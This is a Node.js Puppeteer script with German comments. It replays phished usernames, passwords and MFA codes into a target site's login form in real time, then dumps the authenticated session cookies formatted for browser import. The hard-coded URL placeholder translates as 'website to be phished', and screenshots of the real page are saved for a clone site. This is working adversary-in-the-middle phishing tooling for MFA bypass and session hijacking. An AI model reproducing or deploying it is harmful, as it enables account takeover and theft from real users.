const puppeteer = require('puppeteer');
const readline = require('readline');

(async () => {
  const browser = await puppeteer.launch({ headless: true });
  const page = await browser.newPage();
  const screenshotfile = '../website/grafik.png';
  const screenypath = '../website/screenshots/';
  const mfscreenshotfile = '../website/mf.png';


  console.log('Puppeteer ready. Type a command (e.g. "goto https://example.com", "screenshot", or "exit")');

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    terminal: false
  });

  rl.on('line', async (line) => {
    const [command, ...args] = line.trim().split(' ');
    const argStr = args.join(' ');

    try {
      switch (command) {
        case 'goto':
          console.log(`Navigating to ${argStr}...`);
          await page.goto('https://url_der_zu_phishenden_webseite.de');
          console.log('Navigation complete.');

          break;

        case 'screenshot':
          console.log('Create Screenshot...');
          const screeny = screenypath + argStr;
          await page.setViewport({width: 1920, height: 1080});
          await page.screenshot({ path: screeny });
          console.log(`Screenyshot saved to ${argStr}`);
          break;

        //Input Username
        case 'user':
          console.log(`Login User: ${argStr}...`);
          const resultsSelector = 'xpath=//input[@id="username"]';
          await page.waitForSelector(resultsSelector);
          await page.type(resultsSelector, argStr);
          await page.click('xpath=//button[@name="action"]');
          break;

        //Input Password
        case 'pw':
          console.log(`pw command `);
          const pwSelector = 'xpath=//input[@id="password"]';
          await page.waitForSelector(pwSelector);
          await page.type(pwSelector, argStr);
          await page.click('xpath=//button[@name="action"]');
          break;


        case 'mf':
          console.log(`mf command ${argStr}`);
          const mfSelector = 'xpath=//input[@id="code"]';
          await page.waitForSelector(mfSelector);
          await page.type(mfSelector, argStr);
          await page.click('xpath=//button[@name="action"]');

          //Cookie auslesen
          //Cookies benötigen "hostOnly": true um zu funktionieren
          await new Promise(resolve => setTimeout(resolve, 3000));
          const cookies = await page.cookies();
          const cookiesString = JSON.stringify({ cookies });
          console.log(cookiesString.replaceAll('"sameSite":"Lax"','"sameSite":"lax"').replaceAll('"sameSite":"None"','"sameSite":"no_restriction"'));
          break


        case 'exit':
          console.log('Closing browser...');
          await browser.close();
          rl.close();
          process.exit(0);
          break;

        default:
          console.log(`Unknown command: ${command}`);
      }
    } catch (err) {
      console.error('Error executing command:', err.message);
    }
  });
})();

